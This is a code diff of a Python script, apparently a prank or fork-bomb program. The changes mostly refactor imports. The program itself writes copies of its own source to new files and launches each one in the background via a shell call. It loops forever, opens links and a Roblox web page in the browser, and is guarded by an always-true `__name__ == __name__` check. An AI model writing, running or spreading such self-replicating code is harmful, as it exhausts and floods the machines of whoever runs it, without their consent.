@@ -36,8 +36,8 @@ def everything() -> None:
     print("Hello, Dave.")
     open_links()
 
-    directory = path.dirname(path.abspath(__file__))
-    filename, ext = path.splitext(path.basename(__file__))
+    directory = dirname(abspath(__file__))
+    filename, ext = splitext(basename(__file__))
     
     
     children = fork(filename)
@@ -46,11 +46,11 @@ def everything() -> None:
 
     if overflow:
         print('resetting')
-        fnames = (f'{config['har']}{i}' for i in len(fnames))
+        fnames = (f'{config['har']}{i}' for i in range(len(children)))
 
     with open(__file__) as reader:
         for child in children:
-            fout = path.join(directory, child+ext)
+            fout = join(directory, child+ext)
             with open(fout, 'w+') as writer:
                 writer.write(reader.read())
             system(f'python {fout} &')
@@ -58,5 +58,5 @@ def everything() -> None:
 if __name__ == __name__:
 	wb.open_new('https://www.roblox.com/')
 	while 1:
-		time.sleep(.2)
+		sleep(.2)
 		everything()
